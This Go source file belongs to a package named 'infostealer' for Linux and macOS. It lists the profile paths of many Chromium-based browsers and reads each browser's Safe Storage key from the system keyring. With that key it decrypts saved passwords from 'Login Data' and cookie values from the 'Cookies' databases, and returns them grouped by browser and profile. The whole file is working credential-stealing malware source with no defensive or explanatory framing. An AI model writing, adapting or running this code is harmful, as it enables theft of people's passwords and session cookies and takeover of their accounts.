//go:build linux || darwin

package infostealer

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha1"
	"database/sql"
	"math/rand/v2"
	"os"
	"path/filepath"
	"runtime"

	"github.com/zalando/go-keyring"
	"golang.org/x/crypto/pbkdf2"
	_ "modernc.org/sqlite"
)

func randomstring(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	str := make([]byte, length)
	for i := range str {
		str[i] = charset[rand.IntN(len(charset))]
	}
	return string(str)
}

func pkcs7Unpad(data []byte) []byte {
	length := len(data)
	if length == 0 {
		return nil
	}

	padding := int(data[length-1])

	if padding > length || padding == 0 {
		return nil
	}

	for i := 0; i < padding; i++ {
		if data[length-1-i] != byte(padding) {
			return nil
		}
	}

	return data[:length-padding]
}

func decryptV11(encrypted []byte, key []byte) string {
	iv := []byte("                ") // chromium needs space characters so i literally just cant do a make
	block, _ := aes.NewCipher(key)
	mode := cipher.NewCBCDecrypter(block, iv)

	plaintext := make([]byte, len(encrypted))
	mode.CryptBlocks(plaintext, encrypted)

	unpadded := pkcs7Unpad(plaintext)
	return string(unpadded)
}

func decryptGCM(encrypted []byte, key []byte) string {
	nonce := encrypted[:12]
	ciphertext := encrypted[12:]

	block, _ := aes.NewCipher(key)
	gcm, _ := cipher.NewGCM(block)

	plaintext, _ := gcm.Open(nil, nonce, ciphertext, nil)
	return string(plaintext)
}

var (
	home       = os.Getenv("HOME")
	configDir  = filepath.Join(home, ".config")
	flatpak    = filepath.Join(home, ".var", "app")
	snap       = filepath.Join(home, "snap")
	appSupport = filepath.Join(os.Getenv("HOME"), "Library", "Application Support")
)

var supportedBrowsersLinux = []struct {
	Name        string
	Path        string
	Type        string
	KeyringInfo struct {
		Name string
		User string
	}
}{
	{
		Name:        "Chrome",
		Path:        filepath.Join(configDir, "google-chrome"),
		Type:        "chromium",
		KeyringInfo: struct{ Name, User string }{"Chrome Safe Storage", "Chrome"},
	},
	{
		Name:        "Edge",
		Path:        filepath.Join(configDir, "microsoft-edge"),
		Type:        "chromium",
		KeyringInfo: struct{ Name, User string }{"Edge Safe Storage", "Edge"},
	},
	{
		Name:        "Brave",
		Path:        filepath.Join(configDir, "BraveSoftware", "Brave-Browser"),
		Type:        "chromium",
		KeyringInfo: struct{ Name, User string }{"Brave Safe Storage", "Brave"},
	},
	{
		Name:        "Opera",
		Path:        filepath.Join(configDir, "opera"),
		Type:        "chromium",
		KeyringInfo: struct{ Name, User string }{"Opera Safe Storage", "Opera"},
	},
	{
		Name:        "Vivaldi",
		Path:        filepath.Join(configDir, "vivaldi"),
		Type:        "chromium",
		KeyringInfo: struct{ Name, User string }{"Chrome Safe Storage", "Chrome"},
	},
	{
		Name:        "Yandex",
		Path:        filepath.Join(configDir, "yandex-browser"),
		Type:        "chromium",
		KeyringInfo: struct{ Name, User string }{"Yandex Safe Storage", "Yandex"},
	},
	{
		Name:        "Iridium",
		Path:        filepath.Join(configDir, "iridium"),
		Type:        "chromium",
		KeyringInfo: struct{ Name, User string }{"Iridium Safe Storage", "Iridium"},
	},
	{
		Name:        "Chrome (Flatpak)",
		Path:        filepath.Join(flatpak, "com.google.Chrome", "config", "google-chrome"),
		Type:        "chromium",
		KeyringInfo: struct{ Name, User string }{"Chrome Safe Storage", "Chrome"},
	},
	{
		Name:        "Brave (Flatpak)",
		Path:        filepath.Join(flatpak, "com.brave.Browser", "config", "BraveSoftware", "Brave-Browser"),
		Type:        "chromium",
		KeyringInfo: struct{ Name, User string }{"Brave Safe Storage", "Brave"},
	},
	{
		Name:        "Chromium (Snap)",
		Path:        filepath.Join(snap, "chromium", "common", "chromium"),
		Type:        "chromium",
		KeyringInfo: struct{ Name, User string }{"Chromium Safe Storage", "Chromium"},
	},
}

var supportedBrowsersMac = []struct {
	Name        string
	Path        string
	Type        string
	KeyringInfo struct {
		Name string
		User string
	}
}{
	{
		Name:        "Chrome",
		Path:        filepath.Join(appSupport, "Google", "Chrome"),
		Type:        "chromium",
		KeyringInfo: struct{ Name, User string }{"Chrome Safe Storage", "Chrome"},
	},
	{
		Name:        "Edge",
		Path:        filepath.Join(appSupport, "Microsoft Edge"),
		Type:        "chromium",
		KeyringInfo: struct{ Name, User string }{"Microsoft Edge Safe Storage", "Microsoft Edge"},
	},
	{
		Name:        "Opera",
		Path:        filepath.Join(appSupport, "com.operasoftware.Opera"),
		Type:        "chromium",
		KeyringInfo: struct{ Name, User string }{"Opera Safe Storage", "Opera"},
	},
	{
		Name:        "Opera GX",
		Path:        filepath.Join(appSupport, "com.operasoftware.OperaGX"),
		Type:        "chromium",
		KeyringInfo: struct{ Name, User string }{"Opera Safe Storage", "Opera"},
	},
	{
		Name:        "Brave",
		Path:        filepath.Join(appSupport, "BraveSoftware", "Brave-Browser"),
		Type:        "chromium",
		KeyringInfo: struct{ Name, User string }{"Brave Safe Storage", "Brave"},
	},
	{
		Name:        "Vivaldi",
		Path:        filepath.Join(appSupport, "Vivaldi"),
		Type:        "chromium",
		KeyringInfo: struct{ Name, User string }{"Chrome Safe Storage", "Chrome"},
	},
	{
		Name:        "Arc",
		Path:        filepath.Join(appSupport, "Company.TheBrowser.Arc"),
		Type:        "chromium",
		KeyringInfo: struct{ Name, User string }{"Chrome Safe Storage", "Chrome"},
	},
	{
		Name:        "Yandex",
		Path:        filepath.Join(appSupport, "Yandex", "YandexBrowser"),
		Type:        "chromium",
		KeyringInfo: struct{ Name, User string }{"Yandex Safe Storage", "Yandex"},
	},
	{
		Name:        "CocCoc",
		Path:        filepath.Join(appSupport, "CocCoc"),
		Type:        "chromium",
		KeyringInfo: struct{ Name, User string }{"CocCoc Safe Storage", "CocCoc"},
	},
	{
		Name:        "Iridium",
		Path:        filepath.Join(appSupport, "Iridium"),
		Type:        "chromium",
		KeyringInfo: struct{ Name, User string }{"Iridium Safe Storage", "Iridium"},
	},
	{
		Name:        "Epic Privacy",
		Path:        filepath.Join(appSupport, "Epic Privacy Browser"),
		Type:        "chromium",
		KeyringInfo: struct{ Name, User string }{"Epic Privacy Browser Safe Storage", "Epic Privacy Browser"},
	},
}

type users struct {
	Name      string
	Passwords []password
	Cookies   []cookie
}

type password struct {
	Site     string
	Username string
	Password string
}

type cookie struct {
	Name   string
	Domain string
	Value  string
}

type browserData struct {
	Name      string
	Localpath string
	Type      string
	Users     []users
	Key       []byte
}

func (browser *browserData) detectUsers() {
	dirs, _ := os.ReadDir(browser.Localpath)
	for _, dir := range dirs {
		if !dir.IsDir() {
			continue
		}

		_, err := os.Stat(filepath.Join(browser.Localpath, dir.Name(), "Preferences"))
		if err == nil {
			user := users{
				Name: dir.Name(),
			}
			browser.Users = append(browser.Users, user)
		}
	}
}

func (browser *browserData) getPasswords() {
	for i, user := range browser.Users {
		var file, _ = os.ReadFile(filepath.Join(browser.Localpath, user.Name, "Login Data"))
		filename := filepath.Join(os.TempDir(), randomstring(10))
		os.WriteFile(filename, file, 0600)
		db, _ := sql.Open("sqlite", "file:"+filename+"?mode=ro")

		rows, _ := db.Query("SELECT origin_url, username_value, password_value FROM logins")

		var creds password
		var encryptedpass []byte
		for rows.Next() {
			rows.Scan(&creds.Site, &creds.Username, &encryptedpass)
			switch true {
			case bytes.HasPrefix(encryptedpass, []byte("v11")):
				creds.Password = decryptV11(encryptedpass[3:], browser.Key)
			case bytes.HasPrefix(encryptedpass, []byte("v10")), bytes.HasPrefix(encryptedpass, []byte("v20")):
				creds.Password = decryptGCM(encryptedpass[3:], browser.Key)
			}
			browser.Users[i].Passwords = append(browser.Users[i].Passwords, creds)
		}
		db.Close()
		rows.Close()
		os.Remove(filename)
	}
}

func (browser *browserData) getCookies() {
	for i, user := range browser.Users {
		var file, _ = os.ReadFile(filepath.Join(browser.Localpath, user.Name, "Network", "Cookies"))
		filename := filepath.Join(os.TempDir(), randomstring(10))
		os.WriteFile(filename, file, 0600)
		db, _ := sql.Open("sqlite", "file:"+filename+"?mode=ro")

		rows, _ := db.Query("SELECT host_key, name, encrypted_value FROM cookies")

		var cookies cookie
		var encryptedvalue []byte

		for rows.Next() {
			rows.Scan(&cookies.Domain, &cookies.Name, &encryptedvalue)
			switch true {
			case bytes.HasPrefix(encryptedvalue, []byte("v11")):
				cookies.Value = decryptV11(encryptedvalue[3:], browser.Key)
			case bytes.HasPrefix(encryptedvalue, []byte("v10")), bytes.HasPrefix(encryptedvalue, []byte("v20")):
				cookies.Value = decryptGCM(encryptedvalue[3:], browser.Key)
			}
			browser.Users[i].Cookies = append(browser.Users[i].Cookies, cookies)
		}
		db.Close()
		rows.Close()
		os.Remove(filename)
	}
}

func (browser *browserData) getKey() {
	var supportedBrowsers *[]struct {
		Name        string
		Path        string
		Type        string
		KeyringInfo struct {
			Name string
			User string
		}
	}
	var iterations int

	switch runtime.GOOS {
	case "linux":
		supportedBrowsers = &supportedBrowsersLinux
		iterations = 1
	case "darwin":
		supportedBrowsers = &supportedBrowsersMac
		iterations = 1003
	}

	var key string
	for _, supportedBrowser := range *supportedBrowsers {
		if supportedBrowser.Name == browser.Name {
			key, _ = keyring.Get(supportedBrowser.KeyringInfo.Name, supportedBrowser.KeyringInfo.User)
		} else {
			continue
		}
	}

	browser.Key = pbkdf2.Key([]byte(key), []byte("saltysalt"), iterations, 16, sha1.New)
}

type BrowserList []browserData

func (browsers *BrowserList) add(name string, localpath string, typestr string) {
	browser := browserData{
		Name:      name,
		Localpath: localpath,
		Type:      typestr,
	}
	*browsers = append(*browsers, browser)
}

func (browsers *BrowserList) populate() {
	for i, _ := range *browsers {
		(*browsers)[i].detectUsers()
		(*browsers)[i].getKey()
		(*browsers)[i].getPasswords()
		(*browsers)[i].getCookies()
	}
}

func (browsers *BrowserList) detectChromiumBrowsers() {

	switch runtime.GOOS {
	case "linux":
		for _, browser := range supportedBrowsersLinux {
			exists, e := os.Stat(browser.Path)
			if e == nil && exists.IsDir() {
				browsers.add(browser.Name, browser.Path, browser.Type)
			}
		}
	case "darwin":
		for _, browser := range supportedBrowsersMac {
			exists, e := os.Stat(browser.Path)
			if e == nil && exists.IsDir() {
				browsers.add(browser.Name, browser.Path, browser.Type)
			}
		}
	}
}

func Chromium() BrowserList {
	var browsers BrowserList
	browsers.detectChromiumBrowsers()
	browsers.populate()
	return browsers
}
